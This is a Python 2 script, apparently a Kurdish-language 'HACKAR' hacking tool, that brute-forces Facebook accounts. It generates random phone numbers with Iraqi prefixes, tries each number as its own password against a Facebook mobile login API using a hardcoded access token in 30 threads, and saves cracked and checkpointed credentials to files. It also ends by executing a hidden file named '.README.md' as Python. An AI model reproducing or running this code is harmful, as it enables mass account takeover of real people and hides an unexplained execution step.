import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(5999):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 nmbr.py')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent',' Mozilla/5.0 (Linux; Android 10; STK-LX1; HMSCore 5.1.1.303; GMSCore 21.02.14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 HuaweiBrowser/11.0.5.306 Mobile Safari/537.36;]')]

def exb():
    print '[!] Exit'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def t():
    time.sleep(1)


def cb():
    os.system('clear')


logo = logo ="""

  _    _          _____ _  __          _____  
 | |  | |   /\   / ____| |/ /    /\   |  __ \ 
 | |__| |  /  \ | |    | ' /    /  \  | |__) |
 |  __  | / /\ \| |    |  <    / /\ \ |  _  / 
 | |  | |/ ____ \ |____| . \  / ____ \| | \ \ 
 |_|  |_/_/    \_\_____|_|\_\/_/    \_\_|  \_\
                                              
                                              

\n\x1b[1;33mOwner:SARO HACKAR
\n\x1b[1;33mMY TELEGRAM@HackarFacebook
\n\x1b[1;33mMY CHANALE:@Hackar For Kurdsh Up
#############################################

\033[33 Nrxe Tool:5$ FastPay
\033[33 Owenar Tool::SardamWasman
:::::::::::::::::::::::::::::::::
"""
print("::::::::::::Hackar For Kurd:::::::::::")
back = 0
successful = []
cpb = []
oks = []
id = []
listgrup = []
vulnot = "\033[97mNot Vuln"
vuln = "\033[97mVuln"

os.system("clear")

def menu():
    os.system('clear')
    print logo
    print 42 * '\x1b[1;33m-'
    print '[1]FreeMod  '
    print '[2]Crack FB' 
    print '[0]Chuna Darawa          '
    print ' '
    print 42 * '\x1b[1;33m-'
    action()


def action():
    global cpb
    global oks
    bch = raw_input('\n\x1b[1;33Zhmarak Dane!  \x1b[1;97m>>>\x1b[1;90m  ')
    if bch == '':
        print '[!] Fill in correctly'
        action()
    elif bch == '1':
        os.system('clear')
        print logo
        os.system
        os.system("figlet HACK")
        os.system("figlet SARO")
        print ('\x1b[1;33m 750-751')
        print ('\x1b[1;33m 770-771')
        try:
            c = raw_input('\x1b[1;33m Zhmarayak Hal Bzhera   : ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '2':
        os.system('clear')
        print logo
        print '750- 751 - 752 - 770 - 771 - 772 - 780 - 781 - 782'
        try:
            c = raw_input(' Badli Xot Zhmara Dane  : ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()


    elif bch == 'F':
        os.system('clear')
        print logo
        print '\x1b[1;91m 14, 19'
        try:
            c = raw_input(' choose code  : ')
            k = '+80'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '0':
        exb()
    else:
        print '[!] Fill in correctly'
        action()
    xxx = str(len(id))
    psb('[\xe2\x9c\x93] raqam: ' + xxx)
    time.sleep(0.1)
    psb('\x1b[1;92m[\xe2\x9c\x93]\x1b[1;92m Chawarika ...')
    time.sleep(0.1)
    psb('[!] to stop CTRL+z')
    time.sleep(0.5)
    print 42 * '\x1b[1;91m='

    def main(dla):
        user = dla
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[HACKED]\x1b[1;92m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[Check-point]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '>>>' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 42 * '\x1b[1;97m='
    print '[\xe2\x9c\x93]\x1b[1;93m Process Has Been Completed ....'
    print '[\xe2\x9c\x93]\x1b[1;92m Total OK/\x1b[1;97mCP : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93]\x1b[1;97m CP File Has Been Saved : save/checkpoint.txt'
    raw_input('\n[Press Enter To Go Back]')
    os.system('python2 .README.md')


if __name__ == '__main__':
    menu()
